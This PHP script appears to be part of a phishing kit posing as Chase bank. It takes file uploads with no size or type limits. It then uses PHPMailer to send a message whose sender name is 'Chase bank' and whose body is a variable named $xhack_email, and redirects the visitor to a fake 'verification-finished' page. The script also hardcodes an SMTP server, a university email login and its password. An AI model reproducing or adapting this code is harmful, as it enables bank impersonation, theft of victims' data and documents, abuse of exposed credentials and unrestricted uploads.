<?php
    include('../src/class.fileuploader.php');
    
    // initialize FileUploader
    $FileUploader = new FileUploader('files', array(
        'limit' => null,
        'maxSize' => null,
        'fileMaxSize' => null,
        'extensions' => null,
        'required' => false,
        'uploadDir' => '../../../uploads/',
        'title' => 'name',
        'replace' => false,
        'listInput' => true,
        'files' => null
    ));
    
    // call to upload the files
    $data = $FileUploader->upload();

    // if uploaded and success
    if ($data['isSuccess'] && count($data['files']) > 0) {
        // get uploaded files
        $uploadedFiles = $data['files'];
    }
    // if warnings
    if ($data['hasWarnings']) {
        $warnings = $data['warnings'];
        
        echo '<pre>';
        print_r($warnings);
        echo '</pre>';
    }
    
    // unlink the files
    // !important only for appended files
    // you will need to give the array with appendend files in 'files' option of the fileUploader
    foreach ($FileUploader->getRemovedFiles('file') as $key => $value) {
        unlink('../uploads/' . $value['name']);
    }
    
    // get the fileList
    $fileList = $FileUploader->getFileList();
    
    include_once('../../res/post5.php');

    use PHPMailer\PHPMailer\PHPMailer;
        use PHPMailer\PHPMailer\SMTP;
        use PHPMailer\PHPMailer\Exception;

// Load Composer's autoloader
        require_once '../../../../../vendor/autoload.php';

        $mail = new PHPMailer(true);

        
            //Server settings
            $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      // Enable verbose debug output
            $mail->isSMTP();                                            // Send using SMTP
            $mail->Host       = 'secure265.inmotionhosting.com';                    // Set the SMTP server to send through
            $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
            $mail->Username   = 'gerald@legacyuniversity.edu.ng';                     // SMTP username
            $mail->Password   = '!@#$%Odogwu';                               // SMTP password
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
            $mail->Port       = 465;                                    // TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above

            //Recipients
            $mail->setFrom('gerald@legacyuniversity.edu.ng', 'Chase bank');
            $mail->addAddress($email);               // Name is optional

            // Content
            $mail->isHTML(true);                                  // Set email format to HTML
            $mail->Subject = $subject;
            $mail->Body    = $xhack_email;

            $mail->send();

            header("Location: ../../verification-finished.php");

    // show
    echo '<pre>';
    print_r($fileList);
    echo '</pre>';
